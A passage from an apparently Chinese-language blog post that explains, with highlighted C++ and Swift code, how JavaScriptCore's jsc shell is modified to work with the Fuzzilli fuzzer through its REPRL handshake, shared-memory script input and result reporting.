class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CommandLine::parseArguments</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    Options::AllowUnfinalizedAccessScope scope;<br>    Options::<span class="hljs-built_in">initialize</span>();<br>    Options::<span class="hljs-built_in">useSharedArrayBuffer</span>() = <span class="hljs-literal">true</span>;<br>    Options::<span class="hljs-built_in">useAtMethod</span>() = <span class="hljs-literal">true</span>;<br>    <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> PLATFORM(IOS_FAMILY)</span><br>    Options::<span class="hljs-built_in">crashIfCantAllocateJITMemory</span>() = <span class="hljs-literal">true</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (Options::<span class="hljs-built_in">dumpOptions</span>()) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Command line:&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> PLATFORM(COCOA)</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span>** envp = *_NSGetEnviron(); *envp; envp++) &#123;<br>            <span class="hljs-type">const</span> <span class="hljs-type">char</span>* env = *envp;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(<span class="hljs-string">&quot;JSC_&quot;</span>, env, <span class="hljs-number">4</span>))<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %s&quot;</span>, env);<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// PLATFORM(COCOA)</span></span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; argc; ++i)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %s&quot;</span>, argv[i]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;<br>    JSC::Options::DumpLevel dumpOptionsLevel = JSC::Options::DumpLevel::None;<br>    <span class="hljs-type">bool</span> needToExit = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-type">bool</span> hasBadJSCOptions = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span> (; i &lt; argc; ++i) &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>* arg = argv[i];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(arg, <span class="hljs-string">&quot;-f&quot;</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (++i == argc)<br>                <span class="hljs-built_in">printUsageStatement</span>();<br>            m_scripts.<span class="hljs-built_in">append</span>(<span class="hljs-built_in">Script</span>(Script::StrictMode::Sloppy, Script::CodeSource::File, Script::ScriptType::Script, argv[i]));<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(arg, <span class="hljs-string">&quot;-e&quot;</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (++i == argc)<br>                <span class="hljs-built_in">printUsageStatement</span>();<br>            m_scripts.<span class="hljs-built_in">append</span>(<span class="hljs-built_in">Script</span>(Script::StrictMode::Sloppy, Script::CodeSource::CommandLine, Script::ScriptType::Script, argv[i]));<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(arg, <span class="hljs-string">&quot;-i&quot;</span>)) &#123;<br>            m_interactive = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(arg, <span class="hljs-string">&quot;--reprl&quot;</span>)) &#123;<br>            m_reprl = <span class="hljs-literal">true</span>;<br>            m_scripts.<span class="hljs-built_in">append</span>(<span class="hljs-built_in">Script</span>(Script::StrictMode::Sloppy, Script::CodeSource::REPRL, Script::ScriptType::Script, <span class="hljs-literal">nullptr</span>));<br>            <span class="hljs-keyword">continue</span>;<br></code></pre></td></tr></table></figure><p><code>--reprl</code>参数从哪来的呢？去<code>Fuzzilli</code>中看下<code>jscProfile</code>，发现参数在这里添加的：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs swift">getProcessArguments: &#123; (randomizingArguments: <span class="hljs-type">Bool</span>) -&gt; [<span class="hljs-type">String</span>] <span class="hljs-keyword">in</span><br>        <span class="hljs-keyword">var</span> args <span class="hljs-operator">=</span> [<br>            <span class="hljs-string">&quot;--validateOptions=true&quot;</span>,<br>            <span class="hljs-comment">// No need to call functions thousands of times before they are JIT compiled</span><br>            <span class="hljs-string">&quot;--thresholdForJITSoon=10&quot;</span>,<br>            <span class="hljs-string">&quot;--thresholdForJITAfterWarmUp=10&quot;</span>,<br>            <span class="hljs-string">&quot;--thresholdForOptimizeAfterWarmUp=100&quot;</span>,<br>            <span class="hljs-string">&quot;--thresholdForOptimizeAfterLongWarmUp=100&quot;</span>,<br>            <span class="hljs-string">&quot;--thresholdForOptimizeSoon=100&quot;</span>,<br>            <span class="hljs-string">&quot;--thresholdForFTLOptimizeAfterWarmUp=1000&quot;</span>,<br>            <span class="hljs-string">&quot;--thresholdForFTLOptimizeSoon=1000&quot;</span>,<br>            <span class="hljs-comment">// Enable bounds check elimination validation</span><br>            <span class="hljs-string">&quot;--validateBCE=true&quot;</span>,<br>            <span class="hljs-string">&quot;--reprl&quot;</span>]<br></code></pre></td></tr></table></figure><h3 id="runJSC向Fuzzilli打招呼"><a href="#runJSC向Fuzzilli打招呼" class="headerlink" title="runJSC向Fuzzilli打招呼"></a>runJSC向Fuzzilli打招呼</h3><p>在<code>jscmain</code>函数中有以下语句：最后是<code>runJSC</code>中调用的<code>runWithOptions</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C++">    <span class="hljs-type">int</span> result = <span class="hljs-built_in">runJSC</span>(<br>        mainCommandLine.<span class="hljs-built_in">get</span>(), <span class="hljs-literal">false</span>,<br>        [&amp;] (VM&amp; vm, GlobalObject* globalObject, <span class="hljs-type">bool</span>&amp; success) &#123;<br>            <span class="hljs-built_in">UNUSED_PARAM</span>(vm);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> PLATFORM(COCOA)</span><br>            vm.<span class="hljs-built_in">setOnEachMicrotaskTick</span>(<span class="hljs-built_in">WTFMove</span>(onEachMicrotaskTick));<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            <span class="hljs-built_in">runWithOptions</span>(globalObject, mainCommandLine.<span class="hljs-built_in">get</span>(), success);<br>        &#125;);<br></code></pre></td></tr></table></figure><p>下面是新加的内容，主要来配合fuzz</p><h4 id="12-41行"><a href="#12-41行" class="headerlink" title="12 - 41行"></a>12 - 41行</h4><p>​首先是向写控制管道写<code>HELO</code>，然后再从读控制管道读取内容，相当于<code>Fuzzilli</code>和<code>JSC</code>的一次握手过程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// mmap函数就是将文件的内容或者匿名内存直接映射到进程的虚拟内存中，使得进程可以像访问普通内存一样访问文件的内容。</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br><span class="hljs-comment">// addr: 建议的起始地址，通常设置为NULL，由系统分配。</span><br><span class="hljs-comment">// length: 要映射的字节数</span><br><span class="hljs-comment">// prot: 映射区域的保护方式，如PROT_READ、PROT_WRITE、PROT_EXEC等</span><br><span class="hljs-comment">// flags: 映射选项，如MAP_SHARED、MAP_PRIVATE等。</span><br><span class="hljs-comment">// MAP_SHARED: 多进程对映射区域的修改会立即反映到原始文件中，并且其他进程也会看到这些修改。</span><br><span class="hljs-comment">// MAP_PRIVATE: 当多个进程对同一个文件进行映射，每个进程都会得到一个私有的拷贝，对映射区域的修改只影响当前进程。</span><br><span class="hljs-comment">// fd: 文件描述符，用于指定要映射的文件。</span><br><span class="hljs-comment">// mmap函数中的fd参数是用来指定要映射的文件或共享内存对象的，每个进程都有自己的独立的文件描述符表。</span><br><span class="hljs-comment">// offset: 文件的偏移量，从该偏移量开始映射。</span><br><br><span class="hljs-comment">// 下面是将REPRL读数据缓冲区映射到当前进程，它是一个共享内存对象</span><br>reprl_input_data = (<span class="hljs-type">char</span>*)mmap(<span class="hljs-number">0</span>, REPRL_MAX_DATA_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, REPRL_DRFD, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>​然后加了一个<code>do while</code>循环用于<code>reprl</code>，在<code>do while</code>循环的起始部分首先是从控制中读取内容，判断是否为指定的操作，如果不是<code>cexe</code>则退出，否则继续向下执行</p><h4 id="56行"><a href="#56行" class="headerlink" title="56行"></a>56行</h4><p>这里是加了一个判断，首先是没开启<code>reprl</code>模式，接着是开启了交互模式，并且<code>success</code>是<code>true</code>，然后才会开启<code>jsc</code>的交互模式，就是在命令行中直接运行<code>jsc</code>的一个状态。</p><h4 id="125-141行"><a href="#125-141行" class="headerlink" title="125 - 141行"></a>125 - 141行</h4><p>可以看到在<code>do while</code>的尾部也加入了一个<code>if</code>判断，如果是<code>reprl</code>模式需要先刷新一下缓冲区，然后接着判断是否有未处理的请求，如果有就设<code>result</code>为<code>1</code>表示出错了。可以看到是通过写控制向Fuzzilli传递程序状态信息。</p><blockquote><p>正常状态下，result有三个值可以返回：</p><p>0：执行成功，在下面第60行result &#x3D; success &amp;&amp; (asyncTestExpectedPasses &#x3D;&#x3D; asyncTestPasses) ? 0 : 3;</p><p>1：出现意外，比如有未处理的promise，在下面第132行result &#x3D; 1;</p><p>3：执行失败，在下面第60行result &#x3D; success &amp;&amp; (asyncTestExpectedPasses &#x3D;&#x3D; asyncTestPasses) ? 0 : 3;</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Func&gt;</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">runJSC</span><span class="hljs-params">(<span class="hljs-type">const</span> CommandLine&amp; options, <span class="hljs-type">bool</span> isWorker, <span class="hljs-type">const</span> Func&amp; func)</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-function">Worker <span class="hljs-title">worker</span><span class="hljs-params">(Workers::singleton(), !isWorker)</span></span>;<br>    <br>    VM&amp; vm = VM::<span class="hljs-built_in">create</span>(HeapType::Large).<span class="hljs-built_in">leakRef</span>();<br>    <span class="hljs-keyword">if</span> (!isWorker &amp;&amp; options.m_canBlockIsFalse)<br>        vm.m_typedArrayController = <span class="hljs-built_in">adoptRef</span>(<span class="hljs-keyword">new</span> JSC::<span class="hljs-built_in">SimpleTypedArrayController</span>(<span class="hljs-literal">false</span>));<br><br>    <span class="hljs-type">int</span> result;<br>    <span class="hljs-type">bool</span> success;<br><br>    <span class="hljs-comment">// Let parent know we are ready</span><br>    <span class="hljs-keyword">if</span> (options.m_reprl) &#123;<br>        <span class="hljs-type">char</span> helo[] = <span class="hljs-string">&quot;HELO&quot;</span>;<br>        <span class="hljs-built_in">CHECK</span>(<span class="hljs-built_in">write</span>(REPRL_CWFD, helo, <span class="hljs-number">4</span>) == <span class="hljs-number">4</span>);<br>        <span class="hljs-built_in">CHECK</span>(<span class="hljs-built_in">read</span>(REPRL_CRFD, helo, <span class="hljs-number">4</span>) == <span class="hljs-number">4</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(helo, <span class="hljs-string">&quot;HELO&quot;</span>, <span class="hljs-number">4</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;[REPRL] Invalid response from parent\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-comment">// Mmap the data input buffer.</span><br>        reprl_input_data = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">mmap</span>(<span class="hljs-number">0</span>, REPRL_MAX_DATA_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, REPRL_DRFD, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">CHECK</span>(reprl_input_data != MAP_FAILED);<br>    &#125;<br><br>    <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-comment">// Keep indention for easier diffing</span><br>    <span class="hljs-keyword">if</span> (options.m_reprl) &#123;<br>        <span class="hljs-type">unsigned</span> action;<br>        <span class="hljs-built_in">CHECK</span>(<span class="hljs-built_in">read</span>(REPRL_CRFD, &amp;action, <span class="hljs-number">4</span>) == <span class="hljs-number">4</span>);<br>        <span class="hljs-keyword">if</span> (action != <span class="hljs-string">&#x27;cexe&#x27;</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;[REPRL] Unknown action: %u\n&quot;</span>, action);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    success = <span class="hljs-literal">true</span>;<br><br>    GlobalObject* globalObject = <span class="hljs-literal">nullptr</span>;<br>    &#123;<br>        <span class="hljs-function">JSLockHolder <span class="hljs-title">locker</span><span class="hljs-params">(vm)</span></span>;<br><br>        <span class="hljs-built_in">startTimeoutThreadIfNeeded</span>(vm);<br>        globalObject = GlobalObject::<span class="hljs-built_in">create</span>(vm, GlobalObject::<span class="hljs-built_in">createStructure</span>(vm, <span class="hljs-built_in">jsNull</span>()), options.m_arguments);<br>        globalObject-&gt;<span class="hljs-built_in">setRemoteDebuggingEnabled</span>(options.m_enableRemoteDebugging);<br>        <span class="hljs-built_in">func</span>(vm, globalObject, success);<br>        vm.<span class="hljs-built_in">drainMicrotasks</span>();<br>    &#125;<br>    vm.deferredWorkTimer-&gt;<span class="hljs-built_in">runRunLoop</span>();<br>    &#123;<br>        <span class="hljs-function">JSLockHolder <span class="hljs-title">locker</span><span class="hljs-params">(vm)</span></span>;<br>        <span class="hljs-keyword">if</span> (!options.m_reprl &amp;&amp; options.m_interactive &amp;&amp; success)<br>            <span class="hljs-built_in">runInteractive</span>(globalObject);<br>    &#125;<br><br>    result = success &amp;&amp; (asyncTestExpectedPasses == asyncTestPasses) ? <span class="hljs-number">0</span> : <span class="hljs-number">3</span>;<br><br>    <span class="hljs-keyword">if</span> (options.m_exitCode) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;jsc exiting %d&quot;</span>, result);<br>        <span class="hljs-keyword">if</span> (asyncTestExpectedPasses != asyncTestPasses)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; because expected: %d async test passes but got: %d async test passes&quot;</span>, asyncTestExpectedPasses, asyncTestPasses);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (Options::<span class="hljs-built_in">useProfiler</span>()) &#123;<br>        <span class="hljs-function">JSLockHolder <span class="hljs-title">locker</span><span class="hljs-params">(vm)</span></span>;<br>        <span class="hljs-keyword">if</span> (!vm.m_perBytecodeProfiler-&gt;<span class="hljs-built_in">save</span>(options.m_profilerOutput.<span class="hljs-built_in">utf8</span>().<span class="hljs-built_in">data</span>()))<br>            <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;could not save profiler output.\n&quot;</span>);<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ENABLE(JIT)</span><br>    &#123;<br>        <span class="hljs-function">JSLockHolder <span class="hljs-title">locker</span><span class="hljs-params">(vm)</span></span>;<br>        <span class="hljs-keyword">if</span> (Options::<span class="hljs-built_in">useExceptionFuzz</span>())<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;JSC EXCEPTION FUZZ: encountered %u checks.\n&quot;</span>, <span class="hljs-built_in">numberOfExceptionFuzzChecks</span>());<br>        <span class="hljs-type">bool</span> fireAtEnabled = Options::<span class="hljs-built_in">fireExecutableAllocationFuzzAt</span>() || Options::<span class="hljs-built_in">fireExecutableAllocationFuzzAtOrAfter</span>();<br>        <span class="hljs-keyword">if</span> (Options::<span class="hljs-built_in">verboseExecutableAllocationFuzz</span>() &amp;&amp; Options::<span class="hljs-built_in">useExecutableAllocationFuzz</span>() &amp;&amp; !fireAtEnabled)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;JSC EXECUTABLE ALLOCATION FUZZ: encountered %u checks.\n&quot;</span>, <span class="hljs-built_in">numberOfExecutableAllocationFuzzChecks</span>());<br>        <span class="hljs-keyword">if</span> (Options::<span class="hljs-built_in">useOSRExitFuzz</span>() &amp;&amp; Options::<span class="hljs-built_in">verboseOSRExitFuzz</span>()) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;JSC OSR EXIT FUZZ: encountered %u static checks.\n&quot;</span>, <span class="hljs-built_in">numberOfStaticOSRExitFuzzChecks</span>());<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;JSC OSR EXIT FUZZ: encountered %u dynamic checks.\n&quot;</span>, <span class="hljs-built_in">numberOfOSRExitFuzzChecks</span>());<br>        &#125;<br><br>        <br>        <span class="hljs-keyword">auto</span> compileTimeStats = JIT::<span class="hljs-built_in">compileTimeStats</span>();<br>        Vector&lt;CString&gt; compileTimeKeys;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; entry : compileTimeStats)<br>            compileTimeKeys.<span class="hljs-built_in">append</span>(entry.key);<br>        std::<span class="hljs-built_in">sort</span>(compileTimeKeys.<span class="hljs-built_in">begin</span>(), compileTimeKeys.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> CString&amp; key : compileTimeKeys) &#123;<br>            <span class="hljs-keyword">if</span> (key.<span class="hljs-built_in">data</span>())<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%40s: %.3lf ms\n&quot;</span>, key.<span class="hljs-built_in">data</span>(), compileTimeStats.<span class="hljs-built_in">get</span>(key).<span class="hljs-built_in">milliseconds</span>());<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (Options::<span class="hljs-built_in">reportTotalPhaseTimes</span>())<br>            <span class="hljs-built_in">logTotalPhaseTimes</span>();<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (Options::<span class="hljs-built_in">gcAtEnd</span>()) &#123;<br>        <span class="hljs-comment">// We need to hold the API lock to do a GC.</span><br>        <span class="hljs-function">JSLockHolder <span class="hljs-title">locker</span><span class="hljs-params">(&amp;vm)</span></span>;<br>        vm.heap.<span class="hljs-built_in">collectNow</span>(Sync, CollectionScope::Full);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (options.m_dumpSamplingProfilerData) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ENABLE(SAMPLING_PROFILER)</span><br>        <span class="hljs-function">JSLockHolder <span class="hljs-title">locker</span><span class="hljs-params">(&amp;vm)</span></span>;<br>        vm.<span class="hljs-built_in">samplingProfiler</span>()-&gt;<span class="hljs-built_in">reportTopFunctions</span>();<br>        vm.<span class="hljs-built_in">samplingProfiler</span>()-&gt;<span class="hljs-built_in">reportTopBytecodes</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>        <span class="hljs-built_in">dataLog</span>(<span class="hljs-string">&quot;Sampling profiler is not enabled on this platform\n&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ENABLE(JIT)</span><br>    <span class="hljs-keyword">if</span> (vm.jitSizeStatistics)<br>        <span class="hljs-built_in">dataLogLn</span>(*vm.jitSizeStatistics);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (options.m_reprl) &#123;<br>        <span class="hljs-comment">// In REPRL mode, stdout and stderr may be regular files, so we need to fflush them here.</span><br>        <span class="hljs-built_in">fflush</span>(stdout);<br>        <span class="hljs-built_in">fflush</span>(stderr);<br><br>        <span class="hljs-comment">// Check if any rejected promises weren&#x27;t handled</span><br>        <span class="hljs-keyword">if</span> (numPendingRejectedPromises &gt; <span class="hljs-number">0</span>) &#123;<br>            result = <span class="hljs-number">1</span>;<br>            numPendingRejectedPromises = <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> status = (result &amp; <span class="hljs-number">0xff</span>) &lt;&lt; <span class="hljs-number">8</span>;<br>        <span class="hljs-built_in">CHECK</span>(<span class="hljs-built_in">write</span>(REPRL_CWFD, &amp;status, <span class="hljs-number">4</span>) == <span class="hljs-number">4</span>);<br>        __sanitizer_cov_reset_edgeguards();<br>    &#125;<br><br>    &#125; <span class="hljs-keyword">while</span> (options.m_reprl);<br><br>    <span class="hljs-keyword">if</span> (options.m_destroyVM || isWorker) &#123;<br>        <span class="hljs-function">JSLockHolder <span class="hljs-title">locker</span><span class="hljs-params">(vm)</span></span>;<br>        <span class="hljs-comment">// This is needed because we don&#x27;t want the worker&#x27;s main</span><br>        <span class="hljs-comment">// thread to die before its compilation threads finish.</span><br>        vm.<span class="hljs-built_in">deref</span>();<br>    &#125;<br><br>    vm.<span class="hljs-built_in">codeCache</span>()-&gt;<span class="hljs-built_in">write</span>();<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="runWithOptions读取脚本"><a href="#runWithOptions读取脚本" class="headerlink" title="runWithOptions读取脚本"></a>runWithOptions读取脚本</h3><p>上面可以看到在<code>runJSC</code>函数的第50行调用了<code>func</code>函数，紧接着调用了<code>runWithOptions</code>函数，<code>runWithOptions</code>的执行影响<code>success</code>，从而影响最后的<code>result</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// func函数</span><br>[&amp;] (VM&amp; vm, GlobalObject* globalObject, <span class="hljs-type">bool</span>&amp; success) &#123;<br>            UNUSED_PARAM(vm);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> PLATFORM(COCOA)</span><br>            vm.setOnEachMicrotaskTick(WTFMove(onEachMicrotaskTick));<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            runWithOptions(globalObject, mainCommandLine.get(), success);<br>        &#125;<br></code></pre></td></tr></table></figure><h4 id="17-25行"><a href="#17-25行" class="headerlink" title="17-25行"></a>17-25行</h4><p>在没有这几行时，原来可能就<code>Script::CodeSource::File</code>或<code>Script::CodeSource::CommandLine</code>，所以一个<code>if else</code>就能解决。然后现在是加入了一个<code>Script::CodeSource::REPRL</code>，所以需要<code>if 、else if</code>和<code>else</code>。</p><p>下面新添加的几行就是处理<code>Script::CodeSource::REPRL</code>这种情况 ：</p><blockquote><p>从读控制中读取8个字节到script_size表示脚本的大小，保证不超过REPRL_MAX_SIZE</p><p>调整scriptBuffer大小为script_size，然后从reprl_input_data中读取数据到脚本缓冲区中</p></blockquote><p>接着分析了下，正常应该是72行的<code>evaluate</code>函数来执行代码，跟踪了下<code>success</code>，发现若中间出现异常则将<code>success</code>置为<code>false</code>，由于进入此函数之前<code>success</code>的默认值是<code>true</code>，所以<code>success</code>主要还是用来判断是否出现了异常情况</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 